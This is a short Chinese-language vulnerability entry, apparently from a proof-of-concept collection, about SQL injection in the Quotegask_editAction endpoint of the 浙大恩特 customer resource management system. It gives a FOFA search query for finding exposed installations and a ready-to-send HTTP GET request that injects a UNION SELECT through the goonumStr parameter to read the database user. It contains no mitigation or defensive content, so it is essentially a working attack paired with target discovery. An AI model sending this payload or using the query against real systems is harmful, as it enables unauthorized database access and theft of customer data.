# 浙大恩特客户资源管理系统Quotegask_editAction存在SQL注入漏洞

浙大恩特客户资源管理系统Quotegask_editAction存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```javascript
app="浙大恩特客户资源管理系统"
```

## poc

```javascript
GET /entsoft/Quotegask_editAction.entweb;.js?goonumStr=1')+UNION+ALL+SELECT+user--+RMMS&method=goonumIsExist HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Length: 34
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```

